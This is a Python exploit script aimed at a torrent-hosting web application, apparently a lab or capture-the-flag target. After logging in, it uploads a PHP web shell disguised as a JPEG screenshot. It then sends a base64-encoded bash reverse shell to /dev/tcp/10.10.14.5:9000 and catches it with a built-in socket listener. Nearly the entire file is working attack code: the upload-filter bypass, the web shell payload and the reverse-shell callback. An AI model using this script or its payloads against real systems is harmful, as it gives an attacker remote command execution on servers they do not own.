#!/usr/bin/python3

import argparse
import requests
import sys, os
import socket
import telnetlib
from threading import Thread
from bs4 import BeautifulSoup
import base64

# Setup
proxies = {"http": "http://127.0.0.1:8080", "https": "http://127.0.0.1:8080"}
r = requests.session()

# Create the Functions

def handler():
    t = telnetlib.Telnet()
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.bind(('0.0.0.0',9000))
    s.listen(1)
    conn, addr = s.accept()
    print("[+] Connection received") 
    t.sock = conn
    t.interact()
    
def login(rhost, username, password):

    print("[+] Logging in")
    url = "http://%s/torrent/login.php"%rhost
    headers = {"Content-Type": "application/x-www-form-urlencoded"}

    r.get(url, proxies=proxies)

    credentials = {'username':username, 'password': password}
    r.post(url, proxies=proxies, data=credentials, cookies=r.cookies, headers=headers)

''' Not working for some reason
def uploadTorrent(rhost):

    print("[+] Uploading torrent")
    url = "http://%s/torrent/torrents.php?mode=upload"%rhost

    torrentData = 'ZDg6YW5ub3VuY2UzNTp1ZHA6Ly90cmFja2VyLm9wZW5iaXR0b3JyZW50LmNvbTo4MDEzOmNyZWF0aW9uIGRhdGVpMTMyNzA0OTgyN2U0OmluZm9kNjpsZW5ndGhpMjBlNDpuYW1lMTA6c2FtcGxlLnR4dDEyOnBpZWNlIGxlbmd0aGk2NTUzNmU2OnBpZWNlczIwOlzF5lK+DebyeAWzBGT/mwD0ifDJNzpwcml2YXRlaTFlZWU='

    # Saving torrent to a file
    os.system("echo %s | base64 -d > /tmp/myTorrent.torrent"%torrentData)

    # Opening file to put content in request
    torrentFile = {
		'image':('myTorrent.torrent', open('/tmp/myTorrent.torrent', 'rb'),'application/x-bittorrent'),
		'filename':(None,"myTorrent.torrent"),
        'type':(None, "3"),
        'subtype':(None, "19"),
        'submit':(None, "Upload Torrent"),
        'anoymous2':(None, "false"),
        'anoymous':(None, "true"),
        'autoset':(None, "enabled"),
        'registration':(None, "false"),
        'hideuser':(None, "false")
	}

    r.post(url, proxies=proxies, files=torrentFile)
'''

def uploadShell(rhost):

    # We need to get ID from torrent Big Bug Bunny

    print("[+] Uploading shell")

    url = "http://%s/torrent/index.php?mode=directory"%  rhost
    request = r.get(url, proxies=proxies)

    soup = BeautifulSoup(request.text, 'html.parser')
    href_tags = soup.find_all('a')

    for tag in href_tags:
        if tag.get_text() == "Big Buck Bunny":
            id = tag['href'][29:]
            # print("ID -->", id)

    url = "http://%s/torrent/upload_file.php"%rhost

    params = {'mode': 'upload', 'id': id}

    torrentFile = {
		'file':('webshell.php', "<?php echo system($_GET['command']); ?>",'image/jpg'),
		'submit':(None,"Submit Screenshot"),
	}

    request = r.post(url, proxies=proxies, params=params, files=torrentFile)

    return id
    
def getReverseShell(rhosts, id):

    url = "http://%s/torrent/upload/%s.php" % (rhosts, id)

    reverseCommand = "bash -i >& /dev/tcp/10.10.14.5/9000 0>&1"

    message_bytes = reverseCommand.encode('ascii')
    base64_bytes = base64.b64encode(message_bytes)
    base64_message = base64_bytes.decode('ascii')

    payload = {
    'command': 'echo ' + base64_message + '| base64 -d | bash'
    }
    
    r.get(url, proxies=proxies, params=payload)

def main():
    # Parse Arguments
    parser = argparse.ArgumentParser()
    parser.add_argument('-t', '--target', help='Target ip address or hostname', required=True)
    parser.add_argument('-u', '--username', help='Target ip address or hostname', required=True)
    parser.add_argument('-p', '--password', help='Target ip address or hostname', required=True)
    args = parser.parse_args()
    
    rhost = args.target
    username = args.username
    password = args.password

    # Call the functions
    # Calling handler
    thr = Thread(target=handler)
    thr.start()

    # Logging in
    login(rhost, username, password)

    # uploadTorrent(rhost)
    id = uploadShell(rhost)
    getReverseShell(rhost, id)

if __name__ == '__main__':
    main()
